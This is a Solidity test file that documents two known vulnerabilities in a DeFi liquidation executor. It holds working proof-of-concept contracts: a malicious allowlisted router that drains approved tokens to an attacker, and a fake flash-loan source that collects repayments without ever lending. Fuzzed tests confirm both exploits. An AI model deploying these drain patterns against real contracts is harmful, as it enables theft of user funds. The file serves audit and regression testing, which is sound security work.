// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Executor} from "../../src/Executor.sol";
import {PlanBuilder as PB} from "../unit/PlanBuilder.sol";
import {ExecutorTestBase} from "../unit/Base.sol";
import {MockERC20} from "../unit/Mocks.sol";

/**
 * INV-09 / INV-10 are KNOWN BROKEN (C-01 / C-02 / DRAFT-01 / DRAFT-02).
 *
 * This file does NOT weaken the invariant statements. It:
 *  1. States the correct property as documentation.
 *  2. Provides deterministic + fuzzed demonstrations that the property is violated.
 *
 * The standing-balance cases (the INV-08 gap and the INV-09 invariant over
 * standing non-WETH) were removed: the Executor holds no standing balance in
 * operation (every plan sweeps its WETH; nothing else is left on it).
 */

/// Malicious allowlisted router: pulls approved tokens to an attacker.
contract KnownFailDrainRouter {
    function steal(address token, address to, uint256 amount) external {
        require(MockERC20(token).transferFrom(msg.sender, to, amount), "drain");
    }
}

interface IUniV3FlashCb {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

/// Plan-controlled flashSource that never lends; still receives the repay transfer.
contract KnownFailFakeFlash {
    function flash(address recipient, uint256, uint256, bytes calldata data) external {
        IUniV3FlashCb(recipient).uniswapV3FlashCallback(0, 0, data);
    }

    function token0() external pure returns (address) {
        return address(0);
    }
}

/*
 * Correct property (INV-09): Non-WETH standing cannot leave except sweep → PROFIT_SINK.
 * Reality: S_ROUTER + L_TAKE_BALANCE drains standing ERC-20 to arbitrary recipient.
 */
contract ExecutorKnownFailINV09 is ExecutorTestBase {
    KnownFailDrainRouter internal drainRouter;
    address internal attacker = makeAddr("kf-attacker");

    function setUp() public override {
        super.setUp();
        drainRouter = new KnownFailDrainRouter();
        ex = new Executor(
            operator,
            sink,
            address(factory),
            factory.initHash(),
            address(drainRouter),
            address(routerB),
            address(weth),
            v2Factory,
            V2_HASH,
            sushiFactory,
            SUSHI_HASH,
            address(curveRegistry)
        );
        pool.setPosition(borrower, 0.95e18, REPAY, COLL_OUT);
    }

    /// Property statement (what SHOULD hold): after execute, non-WETH leaving the
    /// executor must equal increase at PROFIT_SINK only. This test documents the
    /// VIOLATION — it PASSES when the drain succeeds (bug confirmed).
    function test_knownfail_INV09_standing_non_weth_leaves_not_via_sink() public {
        uint256 standing = 1_000e6;
        debt.mint(address(ex), standing);

        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(debt),
            address(debt),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(KnownFailDrainRouter.steal, (address(debt), attacker, standing))
        );
        bytes memory profitLeg =
            PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);
        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );

        uint256 sinkBefore = debt.balanceOf(sink);
        _exec(plan);

        // INV-09 VIOLATED: standing left executor, sink did not receive it.
        assertEq(debt.balanceOf(attacker), standing, "INV-09 broken: attacker got standing");
        assertEq(debt.balanceOf(sink), sinkBefore, "INV-09 broken: sink unchanged (not sweep path)");
        assertEq(debt.balanceOf(address(ex)), 0, "executor drained");
    }

    /// Fuzzed demonstration: any positive standing amount is drainable.
    function testFuzz_knownfail_INV09_any_standing_drainable(uint256 standingSeed) public {
        uint256 standing = bound(standingSeed, 1e6, 5_000_000e6);
        debt.mint(address(ex), standing);

        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(debt),
            address(debt),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(KnownFailDrainRouter.steal, (address(debt), attacker, standing))
        );
        bytes memory profitLeg =
            PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);
        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );

        _exec(plan);
        assertEq(debt.balanceOf(attacker), standing, "INV-09: standing always drainable");
    }
}

/*
 * Correct property (INV-10): Flash repay paid only to a real lender.
 * Reality: plan.flashSource is armed without CREATE2; fake source receives repay.
 */
contract ExecutorKnownFailINV10 is ExecutorTestBase {
    KnownFailFakeFlash internal fake;

    function setUp() public override {
        super.setUp();
        fake = new KnownFailFakeFlash();
    }

    function test_knownfail_INV10_repay_paid_to_fake_flashSource() public {
        debt.mint(address(ex), REPAY);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_UNIV3, address(fake), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(1, _profitLeg())
        );

        uint256 fakeBefore = debt.balanceOf(address(fake));
        _exec(plan);
        uint256 stolen = debt.balanceOf(address(fake)) - fakeBefore;

        assertEq(stolen, REPAY, "INV-10 broken: fake received full repay without lending");
    }

    function testFuzz_knownfail_INV10_fake_receives_flash_amount(uint256 flashSeed) public {
        uint128 flashAmt = uint128(bound(flashSeed, 1e6, REPAY));
        // Scale position to flashAmt so liquidation can use standing funds.
        uint128 collOut = uint128(uint256(flashAmt) * uint256(COLL_OUT) / uint256(REPAY));
        if (collOut == 0) collOut = 1;
        uint128 owed = flashAmt; // fake fees = 0; repay swap still buys OWED-scale via exact size
        // Fund standing for liquidation + fake repay (no real flash credit).
        debt.mint(address(ex), flashAmt);
        // Repay swap needs enough COLL→DEBT to cover flashAmt (fee0+fee1=0).
        uint128 spent = uint128((uint256(flashAmt) * 1e8 + 60_000e6 - 1) / 60_000e6);
        if (spent >= collOut) {
            collOut = spent + uint128(uint256(spent) / 10 + 1);
        }
        pool.setPosition(borrower, 0.9e18, flashAmt, collOut);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_UNIV3, address(fake), address(debt), flashAmt, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), flashAmt),
            PB.poolSwap(address(pCollDebt), address(coll), address(debt), PB.L_EXACT_OUT, flashAmt),
            PB.profit(1, PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0))
        );

        uint256 fakeBefore = debt.balanceOf(address(fake));
        _exec(plan);
        assertEq(
            debt.balanceOf(address(fake)) - fakeBefore,
            flashAmt,
            "INV-10: fake always receives flashAmount"
        );
        // silence unused
        owed;
    }
}
